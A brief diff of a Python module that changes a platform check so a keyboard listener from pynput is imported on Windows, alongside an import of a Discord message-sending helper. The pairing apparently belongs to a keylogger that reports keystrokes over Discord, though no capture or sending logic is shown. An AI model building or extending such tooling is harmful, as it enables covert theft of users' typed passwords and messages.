@@ -1,7 +1,7 @@
 import platform
 from sys import exit
 
-if platform.system() != "Windows":
+if platform.system() == "Windows":
     from pynput.keyboard import Listener
 
 from .discord_file import send_message
